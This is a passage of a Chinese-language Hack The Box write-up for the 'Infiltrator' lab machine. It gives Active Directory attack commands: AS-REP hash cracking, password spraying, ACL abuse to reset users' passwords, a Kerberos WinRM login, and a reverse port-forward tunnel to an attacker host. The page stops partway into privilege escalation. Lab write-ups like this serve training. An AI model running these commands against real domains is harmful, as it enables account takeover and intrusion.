class="variable">$c0a83a0c13c9d3c93845780d212b475ab9dfd03664fc96389a5b4a8a7b72b876309ec91711f79d884f88093518c1fd7c6c392ff1c56cc9b2b6f4b84902023c9fbc1ffb31d19fb65cbefebad093167c7ae1b7939e3b049f0efc404dfd0be057341484c578620f33ba407c998d20897e29bc56ec1c178b07c6bc6132c7b8aa4cc2001b6ccc0e994d78b9427f96c1329a078858eb8300170ad0bf6d5efcce373b3faa17939f71118d1832079db985a6c39904407c5d7e8706798bef1d2b5230a359fdba5303a11367b052af688630da080db393c07064a69fffd715a4c7bbe8533e3b48bfe5c344cb693f0cf79a505f744d8ef3</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>识别 Hash</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nth -f info/KRB_AS_REP.<span class="built_in">hash</span></span><br><span class="line">---</span><br><span class="line">...</span><br><span class="line">Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used <span class="keyword">for</span> Windows Active Directory</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Hashcat 爆破</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 info/KRB_AS_REP.<span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br><span class="line">---</span><br><span class="line">...</span><br><span class="line">$krb5asrep$23<span class="variable">$L</span>.Clark@INFILTRATOR.HTB:65969ff15f18ac84bd58a6185f7ccd24<span class="variable">$93a0a81d05fc4e025b62fd665a350fdfbd750f4e7af34c2bd222ab727fd4a7fa5633c3dde88ed20df3ba406637168e9b45fcf9397784039601cac294c2ecd8cb6b24efec7ee83bece85a0a1a98f2852698284b8912e88fae047d9fdd9c88dfdbccf44c61eaa50427a5415260ebfe26f3db3c2a1efc996a2d92086589f515383854ae3502f0834e0da01ca5d20783d4a6ba3cd6019163df47c291bd99950e16deafa5bf5d7ccc39cfab61c5b71912b9aed41b259c708945e2b51c7d5fb5f7d0dae3cc955efa7ac9569ce98181e306ebc3834a1dd97817e9d6c03f4dfff165f526cc2b2a4b72c418b68cc6ccae4783cb73bd31</span>:WAT?watismypass!</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>拿到凭据 <code>L.Clark : WAT?watismypass!</code></p>
+<h3 id="LDAP-Enum-user"><a href="#LDAP-Enum-user" class="headerlink" title="LDAP Enum user"></a>LDAP Enum user</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap infiltrator.htb -u <span class="string">&#x27;L.Clark&#x27;</span> -p <span class="string">&#x27;WAT?watismypass!&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115145558956.png" class="">
+
+<p>这里拿到了一个 <code>K.turner</code> 用户的备注，很像密码，先保存 <code>MessengerApp@Pass!</code></p>
+<h3 id="密码喷射"><a href="#密码喷射" class="headerlink" title="密码喷射"></a>密码喷射</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerbrute passwordspray -d infiltrator.htb --dc 10.10.11.31 info/user.list <span class="string">&#x27;WAT?watismypass!&#x27;</span></span><br><span class="line">kerbrute passwordspray -d infiltrator.htb --dc 10.10.11.31 info/user.list <span class="string">&#x27;MessengerApp@Pass!&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115154323291.png" class="">
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241116191458803.png" class="">
+
+<p>两个用户使用的是这个密码，可以再枚举一下共享目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb infiltrator.htb -u info/user.list -p <span class="string">&#x27;WAT?watismypass!&#x27;</span> --shares</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115154520414.png" class="">
+
+<p>只有 L.Clark 有共享目录</p>
+<h3 id="SMB-1"><a href="#SMB-1" class="headerlink" title="SMB"></a>SMB</h3><p>使用爬取模块，把共享目录文件信息下载到本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb infiltrator.htb -u L.Clark -p <span class="string">&#x27;WAT?watismypass!&#x27;</span> -M <span class="string">&quot;spider_plus&quot;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115094907649.png" class="">
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115095258652.png" class="">
+
+<p>从共享文件的名称和大小，没发现什么闪光点，这里也可以每个都查看一下。</p>
+<h3 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec winrm infiltrator.htb -u info/user.list -p info/pass.list</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115154707007.png" class="">
+
+<p>WinRM 无法登录</p>
+<h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -c all --zip -dc <span class="string">&#x27;infiltrator.htb&#x27;</span> -ns <span class="string">&#x27;10.10.11.31&#x27;</span> -d <span class="string">&#x27;infiltrator.htb&#x27;</span> -u <span class="string">&#x27;L.Clark&#x27;</span> -p <span class="string">&#x27;WAT?watismypass!&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115101948892.png" class="">
+
+<p>查看高价值路径</p>
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115154907790.png" class="">
+
+<p>这个路径可以拿到 <code>M.Harris</code> 的权限，从而远程登录机器拿到 User Shell</p>
+<p>首先修改 <code>E.Rodriguez</code> 的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取 D.Anderson 票据</span></span><br><span class="line">impacket-getTGT <span class="string">&#x27;infiltrator.htb&#x27;</span>/<span class="string">&#x27;D.Anderson&#x27;</span>:<span class="string">&#x27;WAT?watismypass!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改 FullControl 权限</span></span><br><span class="line">KRB5CCNAME=D.Anderson.ccache /usr/share/doc/python3-impacket/examples/dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -inheritance -principal <span class="string">&#x27;D.Anderson&#x27;</span> -target-dn <span class="string">&#x27;OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB&#x27;</span> <span class="string">&#x27;infiltrator.htb&#x27;</span>/<span class="string">&#x27;D.Anderson&#x27;</span>:<span class="string">&#x27;WAT?watismypass!&#x27;</span> -dc-ip dc01.infiltrator.htb -k -no-pass</span><br><span class="line"></span><br><span class="line">bloodyAD --host <span class="string">&quot;dc01.infiltrator.htb&quot;</span> -d <span class="string">&#x27;infiltrator.htb&#x27;</span> -u <span class="string">&#x27;D.Anderson&#x27;</span> -p <span class="string">&#x27;WAT?watismypass!&#x27;</span> -k --dc-ip <span class="string">&#x27;10.10.11.31&#x27;</span> <span class="built_in">set</span> password <span class="string">&#x27;E.Rodriguez&#x27;</span> <span class="string">&#x27;Admin@123&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115220410982.png" class="">
+
+<p>然后 <code>E.Rodriguez</code> 把自己添加到 <code>Chiefs Marketing</code> 组中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host <span class="string">&quot;dc01.infiltrator.htb&quot;</span> -d <span class="string">&#x27;infiltrator.htb&#x27;</span> -u <span class="string">&#x27;E.Rodriguez&#x27;</span> -p <span class="string">&#x27;Admin@123&#x27;</span> -k --dc-ip <span class="string">&#x27;10.10.11.31&#x27;</span> add groupMember <span class="string">&#x27;Chiefs Marketing&#x27;</span> <span class="string">&#x27;E.Rodriguez&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115221022787.png" class="">
+
+<p>再修改 <code>M.Harris</code> 的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host <span class="string">&quot;dc01.infiltrator.htb&quot;</span> -d <span class="string">&#x27;infiltrator.htb&#x27;</span> -u <span class="string">&#x27;E.Rodriguez&#x27;</span> -p <span class="string">&#x27;Admin@123&#x27;</span> -k --dc-ip <span class="string">&#x27;10.10.11.31&#x27;</span> <span class="built_in">set</span> password <span class="string">&#x27;M.Harris&#x27;</span> <span class="string">&#x27;Admin@123&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115221037702.png" class="">
+
+<p>然后可以使用 <code>M.Harris</code> 账户远程登录了</p>
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115225212345.png" class="">
+
+<p>直接连是不行的，需要使用 Kerberos 认证票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT <span class="string">&#x27;infiltrator.htb&#x27;</span>/<span class="string">&#x27;M.Harris&#x27;</span>:<span class="string">&#x27;Admin@123&#x27;</span></span><br><span class="line">KRB5CCNAME=M.Harris.ccache evil-winrm -i <span class="string">&#x27;dc01.infiltrator.htb&#x27;</span> -u <span class="string">&#x27;M.Harris&#x27;</span> -p <span class="string">&#x27;Admin@123&#x27;</span> -r <span class="string">&#x27;infiltrator.htb&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115225250980.png" class="">
+
+<p>还是出现报错，同时也提示可以省略用户名和密码，这里的原因是 KDC 对于域名 <code>INFILTRATOR.HTB</code> 无法定位需要修改 <code>/etc/krb5.conf</code> 配置文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[libdefaults]</span><br><span class="line">    default_realm = INFILTRATOR.HTB</span><br><span class="line">    dns_lookup_realm = false</span><br><span class="line">    dns_lookup_kdc = false</span><br><span class="line">    forwardable = true</span><br><span class="line">[realms]</span><br><span class="line">    INFILTRATOR.HTB = &#123;</span><br><span class="line">        kdc = dc01.infiltrator.htb</span><br><span class="line">        admin_server = dc01.infiltrator.htb</span><br><span class="line">    &#125;</span><br><span class="line">[domain_realm]</span><br><span class="line">    .infiltrator.htb = INFILTRATOR.HTB</span><br><span class="line">    infiltrator.htb = INFILTRATOR.HTB</span><br></pre></td></tr></table></figure>
+
+<p>再次尝试登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=M.Harris.ccache evil-winrm -i <span class="string">&#x27;dc01.infiltrator.htb&#x27;</span> -r <span class="string">&#x27;infiltrator.htb&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241115231220340.png" class="">
+
+<p>成功获取 Shell 权限，这里为了方便使用 Havoc 上线，然后使用 WinPEAS 枚举本地提权路径</p>
+<h2 id="Shell-as-Administrator"><a href="#Shell-as-Administrator" class="headerlink" title="Shell as Administrator"></a>Shell as Administrator</h2><img src="/2024/11/13/HTB-Infiltrator/image-20241116122518554.png" class="">
+
+<p>在 WinPEAS 中可以看到 14*** 端口有一些服务，把 14*** 的端口转发到本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell c.exe client -v 10.10.16.44:8080 R:0.0.0.0:14406:127.0.0.1:14406 R:0.0.0.0:14118:127.0.0.1:14118 R:0.0.0.0:14122:127.0.0.1:14122 R:0.0.0.0:14123:127.0.0.1:14123 R:0.0.0.0:14125:127.0.0.1:14125 R:0.0.0.0:14126:127.0.0.1:14126 R:0.0.0.0:14127:127.0.0.1:14127 R:0.0.0.0:14128:127.0.0.1:14128 R:0.0.0.0:14130:127.0.0.1:14130 </span><br></pre></td></tr></table></figure>
+
+<p>扫描一下这些端口的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 1000 -T4 -sV -p 14406,14130,14128,14118,14126,14127,14125,14122,14123 127.0.0.1</span><br><span class="line">---</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">14118/tcp open  ssl/unknown</span><br><span class="line">14122/tcp open  unknown</span><br><span class="line">14123/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">14125/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">14126/tcp open  http        Apache httpd 2.4.9 ((Win32) PHP/<span class="number">5.5</span>.<span class="number">12</span>)</span><br><span class="line"><span class="number">14127</span>/tcp open  unknown</span><br><span class="line"><span class="number">14128</span>/tcp open  unknown</span><br><span class="line"><span class="number">14130</span>/tcp open  unknown</span><br><span class="line"><span class="number">14406</span>/tcp open  mysql       MySQL <span class="number">5.5</span>.<span class="number">5</span>-<span class="number">10.1</span>.<span class="number">19</span>-MariaDB</span><br></pre></td></tr></table></figure>
+
+<p>先试试 MySQL</p>
+<img src="/2024/11/13/HTB-Infiltrator/image-20241116123657192.png" class="">
+
+<p>这里提示是需要密码的，试一下前面没用上的 <code>MessengerApp@Pass!</code></p>
+<img src="/2024/11/13/HTB-Infiltrator/image-20241116193359013.png" class="">
+
+<p>还是不对，再看看几个 HTTP 服务，先看 14123 的</p>
+<img src="/2024/11/13/HTB-Infiltrator/image-20241116193503990.png" class="">
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241116193614297.png" class="">
+
+<p>前面发现的 <code>K.turner</code> 用户的备注信息就是 <code>OutPut Messenger</code> 的密码。</p>
+<img src="/2024/11/13/HTB-Infiltrator/image-20241116194231536.png" class="">
+
+<p>发现一些聊天记录，但是没啥营养，再看一下另外两个端口</p>
+<img src="/2024/11/13/HTB-Infiltrator/image-20241116194535973.png" class="">
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241116194543660.png" class="">
+
+<p>也没什么东西，去搜一下 <code>Output Messenger</code> 相关漏洞</p>
+<img src="/2024/11/13/HTB-Infiltrator/image-20241116123805275.png" class="">
+
+<p>可以看到这个 MYSQL 是加载的这个配置文件 <code>C:\Program Files\Output Messenger Server\Plugins\Output\mysql\my.ini</code> </p>
+<img src="/2024/11/13/HTB-Infiltrator/image-20241116123947880.png" class="">
+
+<p>但是这个目录没有权限访问，转到 WinPEAS 中可以看到，目录内的某些目录是可以访问的</p>
+<img src="/2024/11/13/HTB-Infiltrator/image-20241116123747034.png" class="">
+
+<img src="/2024/11/13/HTB-Infiltrator/image-20241116124041883.png" class="">
+
+<p>尝试访问也是失败了，那么找一下这个目录下面有没有什么敏感文件</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/about">关于</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon-Enum"><span class="toc-number">1.</span> <span class="toc-text">Recon &amp; Enum</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap Scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS"><span class="toc-number">1.2.</span> <span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Dir"><span class="toc-number">1.3.</span> <span class="toc-text">Web Dir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rpc"><span class="toc-number">1.4.</span> <span class="toc-text">Rpc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP"><span class="toc-number">1.5.</span> <span class="toc-text">LDAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB"><span class="toc-number">1.6.</span> <span class="toc-text">SMB</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-M-Harris"><span class="toc-number">2.</span> <span class="toc-text">Shell as M.Harris</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-number">2.1.</span> <span class="toc-text">AS-REP Roasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Enum-user"><span class="toc-number">2.2.</span> <span class="toc-text">LDAP Enum user</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84"><span class="toc-number">2.3.</span> <span class="toc-text">密码喷射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-1"><span class="toc-number">2.4.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinRM"><span class="toc-number">2.5.</span> <span class="toc-text">WinRM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound"><span class="toc-number">2.6.</span> <span class="toc-text">BloodHound</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-Administrator"><span class="toc-number">3.</span> <span class="toc-text">Shell as Administrator</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&text=Infiltrator"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&title=Infiltrator"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&is_video=false&description=Infiltrator"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Infiltrator&body=Check out this article: http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&title=Infiltrator"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&title=Infiltrator"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&title=Infiltrator"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&title=Infiltrator"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&name=Infiltrator&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://fermionorz.github.io/2024/11/13/HTB-Infiltrator/&t=Infiltrator"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024
+    Fermionorz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/about">关于</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/lxgw-wenkai-screen-webfont/1.5.0/lxgwwenkaiscreenr.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/fira_code.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'fermionorz/fermionorz.github.io';
+      var utterances_issue_term = 'Blog';
+      var utterances_label = 'Blog-Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
